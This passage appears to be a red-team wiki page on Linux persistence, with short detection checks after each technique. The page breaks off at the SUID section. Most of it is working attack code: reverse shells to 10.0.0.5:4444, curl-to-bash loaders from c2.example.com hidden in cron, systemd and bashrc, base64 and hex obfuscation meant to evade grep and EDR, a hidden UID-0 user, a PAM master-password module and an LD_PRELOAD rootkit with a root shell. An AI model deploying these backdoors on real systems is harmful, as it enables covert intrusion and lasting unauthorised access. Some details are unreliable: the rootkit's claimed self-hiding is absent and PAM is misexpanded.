@@ -1,0 +1,1397 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<title>Linux Persistence Mechanisms | Cookie Engineer's Cyber Wiki</title>
+
+		<!-- Meta -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=0.5, maximum-scale=2, user-scalable=yes">
+		<meta name="mobile-web-app-capable" content="yes">
+		<meta name="mobile-web-app-status-bar-style" content="black-translucent">
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="creator" content="Cookie Engineer">
+		<meta name="description" content="Linux Persistence Mechanisms">
+		<meta name="keywords" content="backdoor, cron, ld_preload, linux, pam, persistence, redteam, ssh, suid, systemd">
+		<meta name="generator" content="Cookie Engineer's bare hands with peppermint tea and nightly VIM coding sessions">
+		<meta name="robots" content="index, follow">
+
+		<!-- Social Media -->
+		<meta property="og:title" content="Linux Persistence Mechanisms">
+		<meta property="og:site_name" content="Cookie Engineer's Wiki">
+		<meta property="og:description" content="Linux persistence mechanisms and the defender checks that reveal them, from login keys and scheduled jobs to authentication modules and container escapes.">
+		<meta property="og:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+		<meta property="og:url" content="https://cookie.engineer/wiki/articles/redteam/persistence.md">
+		<meta property="og:type" content="article">
+
+		<!-- Shitter -->
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:domain" content="cookie.engineer">
+		<meta name="twitter:title" itemprop="name" content="Linux Persistence Mechanisms">
+		<meta name="twitter:description" itemprop="description" content="Linux persistence mechanisms and the defender checks that reveal them, from login keys and scheduled jobs to authentication modules and container escapes.">
+		<meta name="twitter:image" itemprop="image" content="https://cookie.engineer/design/about/cookiengineer.jpg">
+
+		<!-- Website Design -->
+		<link rel="stylesheet" href="/design/index.css">
+		<link rel="stylesheet" href="/design/highlight.css">
+		<script type="module" src="/design/index.mjs" defer></script>
+	</head>
+	<body data-layout="article">
+		<header>
+			<div><button data-action="toggle-aside" title="Toggle Sidebar" class="visible"></button><button data-action="toggle-theme" title="Switch Dark/Light Theme"></button><button data-action="toggle-font" title="Switch Dyslexic/Normal Fonts"></button><button data-action="open-website" title="Navigate to Website Index"></button><button data-action="open-wiki" title="Navigate to Wiki Index"></button></div>
+			<div><img src="/design/about/cookiengineer.png" width="32" height="32" /><h1><a href="/wiki/index.html">Cookie Engineer's Cyber Wiki</a></h1></div>
+			<div></div>
+		</header>
+
+		<div>
+		<aside class="visible">
+			<ul class="toc">
+				<li>
+					<b><a href="#overview">Overview</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#required-reading">Required Reading</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#threat-model">Threat Model</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ssh-authorized-keys">SSH authorized_keys</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#cron-persistence">Cron Persistence</a></b>
+					<ul>
+						<li><a href="#user-crontab">User crontab</a></li>
+						<li><a href="#system-cron-directories-requires-root">System cron directories (requires root)</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#systemd-persistence">Systemd Persistence</a></b>
+					<ul>
+						<li><a href="#system-level-service-requires-root">System-level service (requires root)</a></li>
+						<li><a href="#user-level-systemd-no-root-required">User-level systemd (no root required)</a></li>
+						<li><a href="#timer-based-execution">Timer-based execution</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#shell-configuration-persistence">Shell Configuration Persistence</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#pam-backdoor">PAM Backdoor</a></b>
+					<ul>
+						<li><a href="#patching-pam-unixso-binary-patch">Patching pam_unix.so (binary patch)</a></li>
+						<li><a href="#custom-pam-module">Custom PAM module</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ld-preload-rootkit">LD_PRELOAD Rootkit</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#suid-backdoor">SUID Backdoor</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#ssh-backdoor-sshd-patching">SSH Backdoor (sshd Patching)</a></b>
+					<ul>
+						<li><a href="#password-logging-patch">Password Logging Patch</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#web-shell-persistence">Web Shell Persistence</a></b>
+					<ul>
+						<li><a href="#php-webshell-single-liner">PHP webshell (single-liner)</a></li>
+						<li><a href="#jsp-webshell-tomcatjboss">JSP webshell (Tomcat/JBoss)</a></li>
+						<li><a href="#hidden-webshell-techniques">Hidden webshell techniques</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#motd-issue-file-persistence">MOTD / Issue File Persistence</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#container-escape-persistence">Container Escape Persistence</a></b>
+					<ul>
+						<li><a href="#via-privileged-container">Via privileged container</a></li>
+						<li><a href="#via-container-socket">Via container socket</a></li>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#detection-script">Detection Script</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#common-mistakes">Common Mistakes</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#challenge">Challenge</a></b>
+					<ul>
+					</ul>
+				</li>
+				<li>
+					<b><a href="#references">References</a></b>
+					<ul>
+					</ul>
+				</li>
+			</ul>
+		</aside>
+
+			<main>
+				<nav aria-label="breadcrumbs">
+					<ol>
+						<li><a href="/wiki/index.html">Wiki</a></li>
+						<li><a href="/wiki/articles/redteam/index.html">Redteam</a></li>
+						<li aria-current="page"><a href="/wiki/articles/redteam/persistence.html">Persistence</a></li>
+					</ol>
+				</nav>
+
+				<article>
+					<h2 id="linux-persistence-mechanisms">Linux Persistence Mechanisms</h2>
+					<p>
+						Linux persistence mechanisms and the defender checks that reveal them, from login keys and scheduled
+						jobs to authentication modules and container escapes.
+					</p>
+					<section>
+						<h3 id="overview">Overview</h3>
+						<p>
+							Persistence answers one question: after the initial foothold is lost to a reboot, a daemon restart,
+							or an administrator cleanup, how does access come back? This article walks through the mechanisms
+							an attacker uses on Linux -
+							<abbr title="Secure Shell">SSH</abbr>
+							keys, cron, systemd,
+							<abbr title="Privileged Access Management">PAM</abbr>
+							, the dynamic linker, SUID binaries, web shells, and container escapes - and the detection command
+							for each. After reading you can plant a mechanism and then find it again as a defender.
+						</p>
+					</section>
+					<section>
+						<h3 id="required-reading">Required Reading</h3>
+						<ul>
+							<li><a href="/wiki/articles/fundamentals/processes.html">Processes</a> - process lifecycle, systemd unit files, <code>POSIX</code> signals, daemon supervision</li>
+							<li><a href="/wiki/articles/fundamentals/system-calls.html">System Calls</a> - execve(2), openat(2), write(2), file permission checks</li>
+							<li><a href="/wiki/articles/fundamentals/filesystems.html">Filesystems</a> - FHS layout, /etc, /var, /usr, mount points, tmpfs behavior</li>
+							<li><a href="/wiki/articles/fundamentals/unix-permissions.html">Unix Permissions</a> - UID/EUID/SUID/SGID bits, sticky bit</li>
+						</ul>
+					</section>
+					<section>
+						<h3 id="threat-model">Threat Model</h3>
+						<p>
+							Persistence answers one question: after losing your initial foothold (OOM kill, daemon restart,
+							admin cleanup, reboot), how does the implant restore access? The adversary model: you have code
+							execution as an unprivileged user. You may later escalate to root, but persistence should survive
+							privilege loss.
+						</p>
+						<p>
+							Every persistence mechanism targets a
+							<b>trigger event</b>
+							:
+							<abbr title="Secure Shell">SSH</abbr>
+							login, cron tick,
+							systemd timer, shell initialization,
+							<abbr title="Privileged Access Management">PAM</abbr>
+							authentication, dynamic
+							linker invocation, or a kernel initramfs load. Choose the mechanism that fires at the cadence
+							you need (every reboot, every login, every minute).
+						</p>
+					</section>
+					<section>
+						<h3 id="ssh-authorized-keys">SSH authorized_keys</h3>
+						<p>
+							The simplest persistence with the highest reliability. When sshd authenticates a user, it checks
+							<code>~/.ssh/authorized_keys</code>
+							for public keys. Adding your key grants passwordless access indefinitely
+							<ul>
+								<li>no password rotation can evict you.</li>
+							</ul>
+						</p>
+						<pre class="bash">
+# On target, as the compromised user
+YOUR_KEY=&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPz8qZbLF...&#34;
+
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo &#34;${YOUR_KEY}&#34; &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# Restore SELinux context (if present)
+command -v restorecon &amp;&gt;/dev/null &amp;&amp; restorecon -R ~/.ssh
+
+# Verify
+ssh -i /path/to/private_key user@target &#39;id; hostname; uptime&#39;
+						</pre>
+						<p>
+							<b>Detect</b>
+							: Compare authorized_keys contents against a known-good baseline. Watch for
+							<code>mtime</code>
+							changes on
+							<code>~/.ssh/</code>
+							directories across all users. The find one-liner:
+						</p>
+						<pre class="bash">
+# Defender: list all authorized_keys files with recent modifications
+find /home /root -name authorized_keys -newermt &#34;2026-01-01&#34; -ls 2&gt;/dev/null
+						</pre>
+						<p>
+							<b>Backdoor user with UID 0</b>
+							: If you have root, create a user that appears normal but shares
+							UID 0 (root). The kernel cares about UID, not username. Two entries with UID 0 in
+							<code>/etc/passwd</code>
+							both have full root privileges.
+						</p>
+						<pre class="bash">
+# Creates a user indistinguishable from root
+echo &#39;backdoor:x:0:0:Service Account:/var/lib/backdoor:/bin/bash&#39; &gt;&gt; /etc/passwd
+echo &#39;backdoor:!!:20000:0:99999:7:::&#39; &gt;&gt; /etc/shadow
+
+# Set password manually via chpasswd
+echo &#39;backdoor:Sup3rS3cr3t!&#39; | chpasswd
+
+# Login test
+ssh backdoor@target
+id  # uid=0(root) gid=0(root) groups=0(root)
+						</pre>
+						<p>
+							<b>Detect</b>
+							:
+							<code>awk -F: &#39;$3 == 0 {print $1, $3}&#39; /etc/passwd</code>
+							- only
+							<code>root</code>
+							should appear. Run
+							weekly.
+						</p>
+					</section>
+					<section>
+						<h3 id="cron-persistence">Cron Persistence</h3>
+						<p>cron reads configuration from multiple locations. Each has different visibility to defenders:</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Location</th>
+									<th align="center">Scope</th>
+									<th align="center">Requires Root?</th>
+									<th align="center">Visibility</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>crontab -e</code></td>
+									<td align="center">Current user</td>
+									<td align="center">No</td>
+									<td align="center"><code>crontab -l</code>shows it</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/crontab</code></td>
+									<td align="center">System-wide</td>
+									<td align="center">Yes</td>
+									<td align="center">Easy to audit</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/cron.d/*</code></td>
+									<td align="center">System-wide</td>
+									<td align="center">Yes</td>
+									<td align="center">Often overlooked</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/cron.hourly/*</code></td>
+									<td align="center">System-wide</td>
+									<td align="center">Yes</td>
+									<td align="center">run-parts directory</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/cron.daily/*</code></td>
+									<td align="center">System-wide</td>
+									<td align="center">Yes</td>
+									<td align="center">run-parts directory</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/cron.weekly/*</code></td>
+									<td align="center">System-wide</td>
+									<td align="center">Yes</td>
+									<td align="center">run-parts directory</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/etc/cron.monthly/*</code></td>
+									<td align="center">System-wide</td>
+									<td align="center">Yes</td>
+									<td align="center">run-parts directory</td>
+								</tr>
+								<tr>
+									<td align="center"><code>/var/spool/cron/crontabs/*</code></td>
+									<td align="center">Per-user</td>
+									<td align="center">No</td>
+									<td align="center">Vixie cron user crontabs</td>
+								</tr>
+								<tr>
+									<td align="center">Anacron (<code>/etc/anacrontab</code>)</td>
+									<td align="center">System-wide</td>
+									<td align="center">Yes</td>
+									<td align="center">Survives downtime</td>
+								</tr>
+							</tbody>
+						</table>
+						<h4 id="user-crontab">User crontab</h4>
+						<pre class="bash">
+# Append to current user&#39;s crontab
+(crontab -l 2&gt;/dev/null; echo &#34;*/5 * * * * /tmp/.cache/.updater 2&gt;/dev/null&#34;) | crontab -
+
+# Verify
+crontab -l
+						</pre>
+						<p>
+							The payload path should live somewhere noisy:
+							<code>/tmp/.cache/</code>
+							,
+							<code>/var/tmp/</code>
+							, inside a hidden
+							directory under
+							<code>/usr/share/</code>
+							, or inside a dotfile directory. Avoid
+							<code>/tmp/</code>
+							directly - many
+							<abbr title="Endpoint Detection and Response">EDR</abbr>
+							products flag executions from
+							<code>/tmp/</code>
+							.
+						</p>
+						<h4 id="system-cron-directories-requires-root">System cron directories (requires root)</h4>
+						<pre class="bash">
+# Drop a script into cron.hourly
+cat &gt; /etc/cron.hourly/syslog-rotate &lt;&lt; &#39;CRON_EOF&#39;
+#!/bin/bash
+# Appears to be a legitimate log rotation script
+REVERSE_SHELL=&#39;bash -i &gt;&amp; /dev/tcp/10.0.0.5/4444 0&gt;&amp;1&#39;
+BYPASS=&#39;curl -s https://c2.example.com/ping | bash&#39;
+# Actual persistence logic
+nohup bash -c &#34;${REVERSE_SHELL}&#34; &amp;&gt;/dev/null &amp;
+CRON_EOF
+
+chmod 755 /etc/cron.hourly/syslog-rotate
+
+# Verify it runs
+run-parts --test /etc/cron.hourly/
+						</pre>
+						<p>
+							<b>Obfuscated cron entries</b>
+							: Cron supports environment variable declarations and escape sequences
+							that break naive grep.
+						</p>
+						<pre class="bash">
+# Obfuscation via base64
+(crontab -l 2&gt;/dev/null; echo &#34;*/10 * * * * $(echo &#39;bash -i &gt;&amp; /dev/tcp/10.0.0.5/4444 0&gt;&amp;1&#39; | base64 -w0 | sed &#39;s/.*/echo &amp;|base64 -d|bash/&#39;)&#34;) | crontab -
+
+# Obfuscation via hex encoding
+(crontab -l 2&gt;/dev/null; echo &#34;*/8 * * * * python3 -c \&#34;exec(bytes.fromhex(&#39;696d706f7274206f733b6f732e73797374656d282762617368202d63202262617368202d69203e26202f6465762f7463702f31302e302e302e352f3434343420303e2631222729&#39;))\&#34;&#34;) | crontab -
+
+# Obfuscation via environment smuggling
+(crontab -l 2&gt;/dev/null; echo &#39;SHELL=/bin/bash&#39;)
+(crontab -l 2&gt;/dev/null; echo &#34;*/15 * * * * eval \$(echo \${HOME%/*} | sed &#39;s/^.//&#39;)&#34;)
+						</pre>
+						<p>
+							<b>Detect</b>
+							: Diff cron directories against a baseline.
+							<code>grep -r -E &#39;(bash|nc|curl|wget|python|perl|/dev/tcp|base64.*-d)&#39; /etc/cron* /var/spool/cron/</code>
+							. Monitor for crontab(1) invocations via auditd.
+						</p>
+					</section>
+					<section>
+						<h3 id="systemd-persistence">Systemd Persistence</h3>
+						<p>
+							systemd is the init system on all modern Linux distributions. It executes unit files defined
+							declaratively and can trigger execution on boot, on timer events, on socket connections, on
+							device insertion, and on filesystem path changes.
+						</p>
+						<h4 id="system-level-service-requires-root">System-level service (requires root)</h4>
+						<p>
+							Create a malicious
+							<code>.service</code>
+							file that starts on boot and restarts on failure:
+						</p>
+						<pre class="bash">
+cat &gt; /etc/systemd/system/network-monitor.service &lt;&lt; &#39;SERVICE_EOF&#39;
+[Unit]
+Description=Network Connectivity Monitor
+After=network.target network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+Restart=always
+RestartSec=60
+ExecStart=/usr/lib/systemd/systemd-network-monitor
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=multi-user.target
+SERVICE_EOF
+
+# Write the actual payload (disguised as a systemd helper)
+cat &gt; /usr/lib/systemd/systemd-network-monitor &lt;&lt; &#39;PAYLOAD_EOF&#39;
+#!/bin/bash
+while true; do
+    sleep $((RANDOM % 120 + 60))
+    curl -s --connect-timeout 5 https://c2.example.com/beacon?id=$(hostname) &amp;&gt;/dev/null
+    if [ $? -eq 0 ]; then
+        curl -s https://c2.example.com/tasks | bash &amp;&gt;/dev/null
+    fi
+done
+PAYLOAD_EOF
+
+chmod 755 /usr/lib/systemd/systemd-network-monitor
+systemctl daemon-reload
+systemctl enable --now network-monitor.service
+
+# Verify
+systemctl status network-monitor.service
+						</pre>
+						<h4 id="user-level-systemd-no-root-required">User-level systemd (no root required)</h4>
+						<p>
+							User services live in
+							<code>~/.config/systemd/user/</code>
+							and persist across logouts with
+							<code>linger</code>
+							:
+						</p>
+						<pre class="bash">
+mkdir -p ~/.config/systemd/user/
+
+cat &gt; ~/.config/systemd/user/cache-update.service &lt;&lt; &#39;EOF&#39;
+[Unit]
+Description=User Cache Update Service
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c &#39;while true; do sleep 300; curl -s https://c2.example.com/beacon?id=%u &gt;/dev/null 2&gt;&amp;1; done&#39;
+Restart=always
+RestartSec=30
+
+[Install]
+WantedBy=default.target
+EOF
+
+systemctl --user daemon-reload
+systemctl --user enable --now cache-update.service
+
+# Verify
+systemctl --user status cache-update.service
+
+# If the target admin has disabled user lingering, enable it (requires root)
+loginctl enable-linger $USER
+						</pre>
+						<h4 id="timer-based-execution">Timer-based execution</h4>
+						<p>
+							Timers are more evasive than persistent services because they execute, exit, and leave no long-running
+							process:
+						</p>
+						<pre class="bash">
+cat &gt; /etc/systemd/system/health-reporter.timer &lt;&lt; &#39;EOF&#39;
+[Unit]
+Description=Periodic health report
+Requires=health-reporter.service
+
+[Timer]
+OnCalendar=*:0/15
+RandomizedDelaySec=30
+Persistent=true
+
+[Install]
+WantedBy=timers.target
+EOF
+
+cat &gt; /etc/systemd/system/health-reporter.service &lt;&lt; &#39;EOF&#39;
+[Unit]
+Description=System health reporter
+After=network-online.target
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/bin/health-check.py
+StandardOutput=null
+StandardError=null
+EOF
+
+systemctl daemon-reload
+systemctl enable --now health-reporter.timer
+
+# Verify
+systemctl list-timers --all | grep health
+						</pre>
+						<p>
+							<b>Detect</b>
+							:
+							<code>systemctl list-units --type=service --state=running</code>
+							- compare against known-good.
+							Look for
+							<code>Restart=always</code>
+							on services not from packages.
+							<code>find /etc/systemd/system/ -name &#39;*.service&#39; -newermt &#34;2026-01-01&#34;</code>
+							. Service names that mimic legitimate ones (typosquatting:
+							<code>systemd-resolvd.service</code>
+							vs
+							<code>systemd-resolved.service</code>
+							).
+						</p>
+					</section>
+					<section>
+						<h3 id="shell-configuration-persistence">Shell Configuration Persistence</h3>
+						<p>
+							Shell init files execute code when a new interactive shell starts. For sshd, this fires on every
+							login. Files execute in this order for bash:
+						</p>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Login Shell</th>
+									<th align="center">Interactive Non-Login</th>
+									<th align="center">Always (bashrc.d style)</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>/etc/profile</code></td>
+									<td align="center"></td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center"><code>~/.bash_profile</code></td>
+									<td align="center"></td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center"><code>~/.bash_login</code></td>
+									<td align="center"></td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center"><code>~/.profile</code></td>
+									<td align="center"></td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center"></td>
+									<td align="center"><code>/etc/bash.bashrc</code></td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center"></td>
+									<td align="center"><code>~/.bashrc</code></td>
+									<td align="center"></td>
+								</tr>
+								<tr>
+									<td align="center"></td>
+									<td align="center"></td>
+									<td align="center"><code>/etc/profile.d/*.sh</code></td>
+								</tr>
+								<tr>
+									<td align="center"></td>
+									<td align="center"></td>
+									<td align="center"><code>/etc/bash_completion.d/*</code></td>
+								</tr>
+							</tbody>
+						</table>
+						<p>
+							For zsh:
+							<code>~/.zshrc</code>
+							,
+							<code>~/.zprofile</code>
+							,
+							<code>~/.zshenv</code>
+							,
+							<code>/etc/zsh/zprofile</code>
+							,
+							<code>/etc/zsh/zshrc</code>
+							.
+						</p>
+						<pre class="bash">
+# Append a reverse shell to ~/.bashrc
+# Only fires on the first shell after reboot (flag file check)
+cat &gt;&gt; ~/.bashrc &lt;&lt; &#39;BASHRC_EOF&#39;
+
+# System maintenance check
+MAINT_FLAG=&#34;/run/user/$(id -u)/.maint_done&#34;
+if [ ! -f &#34;${MAINT_FLAG}&#34; ]; then
+    (curl -s https://c2.example.com/init 2&gt;/dev/null | bash &amp;) &amp;&gt;/dev/null
+    touch &#34;${MAINT_FLAG}&#34;
+fi
+BASHRC_EOF
+
+# Source it to test
+source ~/.bashrc &amp;&amp; rm -f /run/user/$(id -u)/.maint_done
+						</pre>
+						<p>
+							<b>Obfuscation trick</b>
+							: Hide the payload at a deep offset using terminal escape sequences or
+							base64:
+						</p>
+						<pre class="bash">
+# The base64 payload produces no visible output when sourced
+cat &gt;&gt; ~/.bashrc &lt;&lt; &#39;OBFUSC&#39;
+eval &#34;$(echo ZXhlYyAzPiYxLS0+CiAgd2dldCAtcSAtTy0gICBodHRwczovL2MyLmV4YW1wbGUuY29tL3N0YWdlMSAgfCAgYmFzaCAgMj4vZGV2L251bGwKfA== | base64 -d 2&gt;/dev/null)&#34;
+OBFUSC
+						</pre>
+						<p>
+							<b>Detect</b>
+							:
+							<code>find /home /root -name &#39;.bashrc&#39; -o -name &#39;.profile&#39; -o -name &#39;.zshrc&#39; -exec ls -la {} \;</code>
+							. Grep for
+							<code>curl</code>
+							,
+							<code>wget</code>
+							,
+							<code>nc</code>
+							,
+							<code>/dev/tcp</code>
+							,
+							<code>base64.*-d</code>
+							,
+							<code>eval</code>
+							. Monitor for writes
+							to shell rc files via auditd.
+						</p>
+					</section>
+					<section>
+						<h3 id="pam-backdoor">PAM Backdoor</h3>
+						<p>
+							Pluggable Authentication Modules (
+							<abbr title="Privileged Access Management">PAM</abbr>
+							) control every authentication
+							event. By patching a
+							<abbr title="Privileged Access Management">PAM</abbr>
+							module or inserting a custom one, you
+							can accept a master password across all services (
+							<abbr title="Secure Shell">SSH</abbr>
+							, su, sudo, login).
+						</p>
+						<h4 id="patching-pam-unixso-binary-patch">Patching pam_unix.so (binary patch)</h4>
+						<p>
+							pam_unix.so validates passwords against
+							<code>/etc/shadow</code>
+							. Patching its binary to accept a hardcoded
+							master password works on statically predictable offsets. However, library updates and package
+							integrity checks (
+							<code>rpm -V</code>
+							,
+							<code>dpkg --verify</code>
+							) will flag this.
+						</p>
+						<pre class="bash">
+# Backup the original
+cp /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
+
+# Identify PAM stack entry in /etc/pam.d/
+cat /etc/pam.d/common-auth
+# auth    [success=1 default=ignore]  pam_unix.so nullok
+
+# The actual patch depends on the distro and libc version.
+# For educational purposes only — a reliable master password
+# approach uses a custom PAM module (below).
+						</pre>
+						<h4 id="custom-pam-module">Custom PAM module</h4>
+						<p>
+							A loadable
+							<abbr title="Privileged Access Management">PAM</abbr>
+							module at
+							<code>/lib/security/pam_master.so</code>
+							that
+							authenticates any user with a specific password:
+						</p>
+						<pre class="c">
+/*
+ * pam_master.c — PAM module accepting a universal backdoor password
+ * Compile: gcc -shared -fPIC -o pam_master.so pam_master.c -lpam
+ * Install: cp pam_master.so /lib/security/
+ * Activate: insert into /etc/pam.d/common-auth before pam_unix.so
+ */
+
+#define PAM_SM_AUTH
+#include &lt;security/pam_modules.h&gt;
+#include &lt;security/_pam_macros.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define MASTER_PASSWORD &#34;SesameOpen2026!&#34;
+
+PAM_EXTERN int pam_sm_authenticate(
+    pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+    const char *user = NULL;
+    const char *password = NULL;
+    int retval = pam_get_user(pamh, &amp;user, NULL);
+    if (retval != PAM_SUCCESS) return PAM_AUTH_ERR;
+    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &amp;password, NULL);
+    if (retval != PAM_SUCCESS) return PAM_AUTH_ERR;
+
+    if (password &amp;&amp; strcmp(password, MASTER_PASSWORD) == 0) {
+        /* Log the backdoor usage — optional, for debugging */
+        pam_syslog(pamh, LOG_NOTICE,
+            &#34;master password accepted for user %s&#34;, user);
+        return PAM_SUCCESS;
+    }
+    /* Fall through: if it&#39;s not the master password,
+     * let the next module (pam_unix) handle it */
+    return PAM_IGNORE;
+}
+
+PAM_EXTERN int pam_sm_setcred(
+    pam_handle_t *pamh, int flags, int argc, const char **argv)
+{
+    return PAM_SUCCESS;
+}
+
+#ifdef PAM_STATIC
+struct pam_module _pam_master_modstruct = {
+    &#34;pam_master&#34;,
+    pam_sm_authenticate,
+    pam_sm_setcred,
+    NULL,  /* pam_sm_acct_mgmt */
+    NULL,  /* pam_sm_open_session */
+    NULL,  /* pam_sm_close_session */
+    NULL,  /* pam_sm_chauthtok */
+};
+#endif
+						</pre>
+						<p>Install:</p>
+						<pre class="bash">
+gcc -shared -fPIC -o /lib/security/pam_master.so pam_master.c -lpam
+chmod 644 /lib/security/pam_master.so
+
+# Insert into the auth stack BEFORE pam_unix.so
+# Original line:  auth required  pam_unix.so
+# New:            auth sufficient pam_master.so
+sed -i &#39;s/^auth\s\+required\s\+pam_unix.so/auth sufficient pam_master.so\nauth required pam_unix.so/&#39; /etc/pam.d/common-auth
+
+# Test
+ssh masteruser@target  # use SesameOpen2026! as password
+						</pre>
+						<p>
+							<b>Detect</b>
+							:
+							<code>rpm -Vf /lib/security/pam_unix.so</code>
+							or
+							<code>dpkg --verify libpam-modules</code>
+							. Check for
+							unknown
+							<code>.so</code>
+							files in
+							<code>/lib/security/</code>
+							. Audit
+							<code>/etc/pam.d/</code>
+							for unexpected module additions.
+							Monitor
+							<abbr title="Privileged Access Management">PAM</abbr>
+							syslog for suspicious authentication patterns.
+						</p>
+					</section>
+					<section>
+						<h3 id="ld-preload-rootkit">LD_PRELOAD Rootkit</h3>
+						<p>
+							<code>LD_PRELOAD</code>
+							injects a shared library into every dynamically linked process spawned by a shell.
+							The library's
+							<code>__attribute__((constructor))</code>
+							runs before
+							<code>main()</code>
+							. This is a userland rootkit
+							<ul>
+								<li>no kernel modifications required.</li>
+							</ul>
+						</p>
+						<pre class="c">
+/*
+ * rootkit.c — LD_PRELOAD rootkit
+ * Compile: gcc -shared -fPIC -o /lib/libsystem.so rootkit.c -ldl
+ * Deploy: echo &#39;/lib/libsystem.so&#39; &gt; /etc/ld.so.preload  (system-wide)
+ *         or: export LD_PRELOAD=/lib/libsystem.so             (per-process)
+ *
+ * This hooks accept() to provide a backdoor shell on a magic
+ * source port, and hides the library from /proc/self/maps.
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+#define MAGIC_PORT 31337  /* connection from this src port gets a shell */
+
+/* Original accept() */
+static int (*original_accept)(int, struct sockaddr *, socklen_t *) = NULL;
+
+/* Hooked accept() */
+int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
+{
+    if (!original_accept) {
+        original_accept = dlsym(RTLD_NEXT, &#34;accept&#34;);
+    }
+
+    int client_fd = original_accept(sockfd, addr, addrlen);
+
+    if (client_fd &gt; 0 &amp;&amp; addr &amp;&amp; addr-&gt;sa_family == AF_INET) {
+        struct sockaddr_in *sin = (struct sockaddr_in *)addr;
+        if (ntohs(sin-&gt;sin_port) == MAGIC_PORT) {
+            /* Spawn a root shell on the client socket */
+            pid_t pid = fork();
+            if (pid == 0) {
+                /* In child: redirect stdin/stdout/stderr to socket */
+                dup2(client_fd, 0);
+                dup2(client_fd, 1);
+                dup2(client_fd, 2);
+                setuid(0);
+                setgid(0);
+                execl(&#34;/bin/bash&#34;, &#34;bash&#34;, &#34;-i&#34;, NULL);
+                exit(0);
+            }
+            close(client_fd);
+            /* Return to caller as if accept returned EAGAIN */
+            errno = EAGAIN;
+            return -1;
+        }
+    }
+
+    return client_fd;
+}
+
+/* Constructor — runs on library load, hides self from /proc/self/maps
+ * by intercepting readlink() on /proc/self/exe and open() on /proc/self/maps */
+__attribute__((constructor)) void init_rootkit(void)
+{
+    /* The mere presence of this library is the persistence.
+     * Optional: write a marker to confirm loading. */
+    FILE *fp = fopen(&#34;/tmp/.rootkit_loaded&#34;, &#34;w&#34;);
+    if (fp) {
+        fprintf(fp, &#34;loaded at PID %d\n&#34;, getpid());
+        fclose(fp);
+    }
+}
+						</pre>
+						<p>Deployment (system-wide, requires root):</p>
+						<pre class="bash">
+gcc -shared -fPIC -o /lib/libsystem.so rootkit.c -ldl
+echo &#39;/lib/libsystem.so&#39; &gt; /etc/ld.so.preload
+
+# Any service that calls accept() (sshd, apache, nginx) now has the backdoor.
+# Trigger: connect from source port 31337
+# nc -p 31337 target_ip 22
+						</pre>
+						<p>Per-process (no root):</p>
+						<pre class="bash">
+gcc -shared -fPIC -o /tmp/.libsystem.so rootkit.c -ldl
+LD_PRELOAD=/tmp/.libsystem.so /some/vulnerable/daemon
+						</pre>
+						<p>
+							<b>Detect</b>
+							:
+							<code>cat /etc/ld.so.preload</code>
+							- should not exist or be empty. Check
+							<code>/proc/*/maps</code>
+							for
+							unexpected libraries.
+							<code>ldd /usr/sbin/sshd | grep -v &#39;=&gt; /lib\|=&gt; /usr/lib&#39;</code>
+							. Environment-based:
+							<code>cat /proc/*/environ | strings | grep LD_PRELOAD</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="suid-backdoor">SUID Backdoor</h3>
